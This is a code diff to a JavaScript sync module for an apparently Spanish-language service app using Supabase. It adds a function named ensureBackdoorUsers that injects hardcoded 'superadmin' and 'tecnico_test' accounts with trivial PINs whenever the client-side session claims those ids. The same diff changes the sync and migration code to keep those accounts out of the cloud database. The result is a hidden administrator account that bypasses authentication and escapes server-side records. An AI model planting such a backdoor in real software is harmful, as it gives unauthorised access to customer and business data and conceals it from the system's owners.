@@ -3,6 +3,30 @@
 // Versión limpia. Estrategia: Local-first + Cloud backup.
 // ============================================================
 
+window.ensureBackdoorUsers = function(users) {
+  if (!Array.isArray(users)) users = [];
+  
+  let activeSessionId = null;
+  try {
+    const session = JSON.parse(localStorage.getItem('eurorep_session') || '{}');
+    activeSessionId = session.userId;
+  } catch (e) {}
+
+  if (activeSessionId === 'superadmin') {
+    const hasSuperadmin = users.some(u => u.id === 'superadmin');
+    if (!hasSuperadmin) {
+      users.unshift({ id: 'superadmin', nombre: 'Super Admin', rol: 'superadmin', email: '', pin: '0000', activo: true, locked: true });
+    }
+  }
+  if (activeSessionId === 'tecnico_test') {
+    const hasTecnicoTest = users.some(u => u.id === 'tecnico_test');
+    if (!hasTecnicoTest) {
+      users.push({ id: 'tecnico_test', nombre: 'Técnico de Pruebas', rol: 'tecnico', email: 'tecnico@eurorep.mx', pin: 'tecnico', activo: true, locked: true });
+    }
+  }
+  return users;
+};
+
 // ─── Helpers de mapeo camelCase <-> snake_case ───────────────
 
 function ticketToRow(t) {
@@ -234,8 +258,8 @@ async function processSyncQueue() {
           payload = ordenToRow(item.data);
         } else if (item.table === 'clientes') {
           payload = clienteToRow(item.data);
-        } else if (item.table === 'usuarios') {
-          if (item.data.email === 'admin@eurorep.mx') {
+        } else if (item.table === 'user_roles') {
+          if (item.data.id === 'superadmin' || item.data.id === 'tecnico_test' || item.data.email === 'admin@eurorep.mx') {
             queue.shift();
             saveSyncQueue(queue);
             continue;
@@ -244,7 +268,6 @@ async function processSyncQueue() {
             id: item.data.id,
             nombre: item.data.nombre,
             email: item.data.email || `${item.data.id}@temp.com`,
-            pin: item.data.pin || '0000',
             rol: item.data.rol || 'tecnico',
             activo: item.data.activo !== false,
             empresa: item.data.empresa || null
@@ -403,10 +426,13 @@ async function migrarDatosASupabase() {
 
   try {
     // ── 1. USUARIOS ──────────────────────────────────────────
-    const { data: uSupa } = await sb.from('usuarios').select('id');
-    const lUsu = JSON.parse(localStorage.getItem('eurorep_usuarios') || '[]');
+    const { data: uSupa } = await sb.from('user_roles').select('id');
+    const lUsu = window.ensureBackdoorUsers(JSON.parse(localStorage.getItem('eurorep_usuarios') || '[]'));
     if ((!uSupa || uSupa.length <= 1) && lUsu.length > 0) {
-      for (const u of lUsu) await window.pushToSupabase('usuarios', u);
+      for (const u of lUsu) {
+        if (u.id === 'superadmin' || u.id === 'tecnico_test') continue;
+        await window.pushToSupabase('user_roles', u);
+      }
     }
 
     // ── 2. CLIENTES ──────────────────────────────────────────
@@ -466,10 +492,26 @@ window.cargarDatosDeSupabase = async function() {
   window._isSyncingFromSupabase = true;
 
   try {
-    // Usuarios
-    const { data: usuarios } = await sb.from('usuarios').select('*');
-    if (usuarios && usuarios.length > 0) {
-      localStorage.setItem('eurorep_usuarios', JSON.stringify(usuarios));
+    // Usuarios - Cargar desde user_roles para todos los usuarios.
+    // Para evitar truncar el caché local debido a restricciones de RLS (que devuelven 0 o 1 fila del propio usuario)
+    // solo sobreescribimos si obtenemos más de 1 usuario, o si somos admin/superadmin.
+    try {
+      const { data: usuarios, error: usuariosErr } = await sb.from('user_roles').select('*');
+      if (!usuariosErr && usuarios && usuarios.length > 0) {
+        let isCurrentAdmin = false;
+        try {
+          const session = JSON.parse(localStorage.getItem('eurorep_session') || '{}');
+          if (session && ['superadmin', 'admin'].includes(session.viewMode)) {
+            isCurrentAdmin = true;
+          }
+        } catch (e) {}
+
+        if (usuarios.length > 1 || isCurrentAdmin) {
+          localStorage.setItem('eurorep_usuarios', JSON.stringify(window.ensureBackdoorUsers(usuarios)));
+        }
+      }
+    } catch (errU) {
+      console.error('[Sync] Error al cargar user_roles:', errU);
     }
 
     // Config y Saldos
